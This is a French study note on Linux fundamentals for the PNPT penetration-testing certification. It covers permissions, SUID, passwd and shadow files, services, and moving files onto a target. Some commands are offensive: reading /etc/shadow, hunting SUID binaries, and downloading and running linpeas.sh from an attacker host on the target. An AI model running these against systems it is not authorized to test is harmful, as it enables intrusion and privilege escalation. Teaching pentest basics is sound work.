---
title: "Linux Fundamentals (PNPT)"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > PNPT"
tags: [sciences-appliquées, informatique, sécurité, linux, pentest, pnpt]
date: "2026-05-18"
---

# Linux Fundamentals

En pentest, Linux est à la fois ta plateforme d'attaque (Kali, Parrot) et très souvent ta cible (serveurs web, conteneurs, IoT). Savoir lire un système Linux suffisamment vite pour repérer les configurations dangereuses, c'est la moitié du travail de post-exploitation.

## Modèle mental : tout est un fichier

Linux expose presque tout comme des fichiers — disques, processus, devices réseau, sockets. Cette abstraction explique pourquoi les permissions de fichier (`r`, `w`, `x`) sont le mécanisme central de sécurité du système.

```
/                       racine du système
├── etc/                configuration (souvent point d'intérêt en pentest)
│   ├── passwd          comptes utilisateurs (lisible par tous)
│   ├── shadow          hashes des mots de passe (root only)
│   └── sudoers         règles sudo (qui peut faire quoi en root)
├── home/<user>/        données utilisateur
├── var/log/            logs système
├── tmp/                world-writable, point d'attaque classique
└── proc/               état du noyau en temps réel (PID, /proc/<pid>/maps...)
```

## Navigation et lecture rapide

```bash
pwd                          # où suis-je
ls -la                       # contenu + fichiers cachés + permissions
cd -                         # revenir au répertoire précédent
file <fichier>               # identifier le type d'un fichier inconnu

cat /etc/os-release          # quelle distrib, quelle version (utile pour CVE)
uname -a                     # noyau + architecture
id                           # qui je suis + mes groupes (clé en privesc)
```

**Pourquoi `id` est important** : en pentest, dès que tu obtiens un shell, c'est la première commande à lancer. Elle te dit ton UID, ton GUID, et surtout tes groupes secondaires — appartenir au groupe `docker` ou `lxd` = root immédiat.

## Permissions

Le modèle Unix : trois classes (utilisateur, groupe, autres) × trois droits (lecture, écriture, exécution).

```
-rwxr-xr--   1 alice  devs  4096  /opt/script.sh
│└┬┘└┬┘└┬┘     └──┬──┘└─┬─┘
│ │  │  │         │     │
│ │  │  │         │     groupe propriétaire
│ │  │  │         utilisateur propriétaire
│ │  │  autres :    r-- (lecture seule)
│ │  groupe devs :  r-x (lecture + exécution)
│ utilisateur :     rwx (tout)
type : - = fichier, d = dossier, l = lien symbolique
```

Notation numérique : `r=4`, `w=2`, `x=1`. On les additionne par classe.

```bash
chmod 755 script.sh          # rwxr-xr-x : exécutable pour tous, modifiable par le owner
chmod 600 ~/.ssh/id_rsa      # rw------- : clé privée, lisible uniquement par le owner
chmod u+s /usr/bin/binaire   # bit SUID : exécuter avec les droits du propriétaire (souvent root)
```

**À retenir** : un binaire SUID root mal configuré = privilege escalation. La commande `find / -perm -4000 2>/dev/null` liste tous les SUID — c'est un réflexe en post-exploitation.

## Utilisateurs et authentification

```bash
cat /etc/passwd              # liste des comptes (lisible par tous)
sudo cat /etc/shadow         # hashes des mots de passe (root only)
sudo -l                      # quelles commandes je peux lancer en sudo
groups <user>                # appartenance aux groupes
```

Format `/etc/passwd` (un compte par ligne) :
```
alice:x:1001:1001:Alice Martin,,,:/home/alice:/bin/bash
  │   │  │    │         │            │            │
  │   │  │    │         │            │            shell de login
  │   │  │    │         │            répertoire home
  │   │  │    │         GECOS (nom complet, info)
  │   │  │    GID (groupe principal)
  │   │  UID
  │   placeholder password (x = hash dans shadow)
  nom d'utilisateur
```

**Piège courant** : un compte avec UID 0 et un nom différent de `root` = backdoor classique. Regarder les UID 0 multiples (`awk -F: '$3==0 {print $1}' /etc/passwd`) est un réflexe défensif.

## Services et processus

```bash
ps auxf                      # tous les processus, en arbre
systemctl list-units --type=service --state=running
systemctl status <service>
ss -tulnp                    # ports en écoute + processus (remplace netstat)
```

`ss -tulnp` est essentiel en pentest : il te montre quels services écoutent localement (potentielles cibles internes invisibles depuis l'extérieur).

## Transfert de fichiers

Une fois sur la cible, tu dois souvent exfiltrer ou faire monter des outils. Sans interface, on improvise un serveur HTTP :

```
Attaquant (Kali)                          Cible
─────────────────                         ──────
python3 -m http.server 8000      ───►     wget http://10.0.0.1:8000/linpeas.sh
(sert le répertoire courant)              chmod +x linpeas.sh
                                          ./linpeas.sh
```

```bash
# Côté attaquant — héberger un fichier
python3 -m http.server 8000

# Côté cible — récupérer
wget http://10.0.0.1:8000/outil
curl -O http://10.0.0.1:8000/outil

# Transfert direct SSH (plus discret si SSH est dispo)
scp fichier user@cible:/tmp/
```

## Pièges courants

- **`cat /etc/shadow` échoue silencieusement sans sudo** — ne pas conclure que le fichier n'existe pas.
- **`find / -name ...` génère des tonnes d'erreurs** — toujours rediriger : `find / -name "*.conf" 2>/dev/null`.
- **`locate` peut renvoyer un cache obsolète** — `updatedb` met à jour la base mais nécessite root et peut être désactivé.
- **`/tmp` est world-writable** — n'y laisser jamais de fichiers sensibles, et inversement, c'est un endroit privilégié pour déposer des binaires d'attaque.
- **Le shell par défaut peut être `sh` au lieu de `bash`** — certains scripts bash échouent silencieusement. Vérifier avec `echo $SHELL`.
